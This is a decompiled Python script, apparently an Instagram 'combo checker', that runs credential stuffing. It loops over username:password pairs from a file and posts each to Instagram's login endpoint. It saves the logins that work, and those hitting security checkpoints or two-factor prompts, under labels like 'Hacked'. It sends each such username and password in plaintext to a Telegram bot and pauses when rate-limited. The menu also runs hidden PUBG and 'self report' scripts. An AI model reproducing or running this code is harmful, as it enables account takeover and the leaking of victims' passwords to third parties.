# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.0 (default, Dec  5 2019, 10:18:50) 
# [Clang 8.0.7 (https://android.googlesource.com/toolchain/clang b55f2d4ebfd35bf6
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
r = requests.Session()
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
hacked = 0
secure = 0
factor = 0
blocked = 0
bad = 0
error = 0
uid = uuid.uuid4()
cookie = secrets.token_hex(8) * 2
time_now = int(datetime.now().timestamp())
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = G + ' _    _ _   _ _____ ___________ ___________ \n| |  | | | | |_   _/  ___| ___ \  ___| ___ \ \n| |  | | |_| | | | \ `--.| |_/ / |__ | |_/ / \n| |/\| |  _  | | |  `--. \  __/|  __||    /  \n\  /\  / | | |_| |_/\__/ / |   | |___| |\ \ \n \/  \/\_| |_/\___/\____/\_|   \____/\_| \_| \n'
                                           
    print(banner)
    print('❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖')
    try:
        print(' ')
    except:
        pass
    else:
        tele_pythoons = input(Y + '[1] Instagram Combo Checker\n[2] PUBG Combo Checker\n[3] Combo maker\n[4] Self Report\n[F] Developer Facebook\n[I] Developer Instagram\n[T] Developer Telegram\n[+] Choose » ')
        if tele_pythoons == '1':
            print('############################################################')
            r = requests.Session()
            banner = G + ' _    _ _   _ _____ ___________ ___________ \n| |  | | | | |_   _/  ___| ___ \  ___| ___ \ \n| |  | | |_| | | | \ `--.| |_/ / |__ | |_/ / \n| |/\| |  _  | | |  `--. \  __/|  __||    /  \n\  /\  / | | |_| |_/\__/ / |   | |___| |\ \ \n \/  \/\_| |_/\___/\____/\_|   \____/\_| \_| \n'
                                           
            print(banner)
            print('==========================')
            ID = input('Telegram ID ==> ')
            token = input('Telegram BOT Token ==> ')
            try:
                print(' ')
            except:
                pass
            else:
                print(Style.RESET_ALL)
                for account in open('combo.txt', 'r').read().splitlines():
                    username = account.split(':')[0]
                    password = account.split(':')[1]
                    try:
                        cookies = token_hex(8) * 2
                        url = 'https://www.instagram.com/accounts/login/ajax/'
                        headers = {'user-agent':generate_user_agent(), 
                         'x-csrftoken':'missing',  'mid':token_hex(8) * 2}
                        data = {'username':username, 
                         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password), 
                         'queryParams':'{}', 
                         'optIntoOneTap':'false'}
                        req_login = r.post(url, headers=headers, data=data, proxies=None)
                        sleep(0.5)
                        if 'userId' in req_login.text:
                            with open('Hacked.txt', 'a') as (HACKED):
                                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                                SGDVIP = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=★Hacked Insta😍\n---------------------------------\nuser=>{username}\npassword==>{password}\n---------------------------------\nTele ==>@itzthedevil"
                                k = requests.post(SGDVIP)
                            hacked += 1
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                        else:
                            if 'checkpoint_required' in req_login.text:
                                SGDVIP = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=★رايح سكيور😭\n---------------------------------\nuser ==> {username} <== \npass ==> {password} <==\n---------------------------------\nTele ==> @itzthedevil"
                                k = requests.post(SGDVIP)
                                with open('Secure.txt', 'a') as (SECURE):
                                    SECURE.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                                secure += 1
                                os.system('cls' if os.name == 'nt' else 'clear')
                                print(banner + f"\n==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                            else:
                                if 'two_factor_required' in req_login.text:
                                    SGDVIP = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=★تحقق ثنائي😭\n---------------------------------\nuser ==> {username} <==\npass ==> {password} <==\n---------------------------------\nTele ==>@itzthedevil"
                                    k = requests.post(SGDVIP)
                                    with open('two_factor.txt', 'a') as (FACTOR):
                                        FACTOR.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                                    factor += 1
                                    os.system('cls' if os.name == 'nt' else 'clear')
                                    print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                                else:
                                    if 'Please wait a few minutes before you try again.' in req_login.text:
                                        blocked += 1
                                        sleep(8)
                                        os.system('cls' if os.name == 'nt' else 'clear')
                                        print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                                    else:
                                        bad += 1
                                        os.system('cls' if os.name == 'nt' else 'clear')
                                        print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                    except Exception as cc:
                        try:
                            print(cc)
                            error += 1
                            sleep(10)
                            os.system('cls' if os.name == 'nt' else 'clear')
                            print(banner + f"==========================================\n[-] Hacked : {hacked}\n[-] Secure : {secure}\n[-] Two Factor : {factor}\n[-] Checked : {bad}\n[-] Blocked : {blocked}\n[-] Error : {error}")
                        finally:
                            cc = None
                            del cc

        else:
            if tele_pythoons == '2':
                os.system('python .PuBg.py')
            if tele_pythoons == '3':
                os.system('python .CoMbO.py')
            if tele_pythoons == '4':
                os.system('python .SeLf.py')
            if tele_pythoons == 'F':
                os.system('xdg-open https://facebook.com/boy15.beats')
            if tele_pythoons == 'I':
                os.system('xdg-open https://instagram.com/it.qt')
            if tele_pythoons == 'T':
                os.system('xdg-open https://t.me/itzthedevil')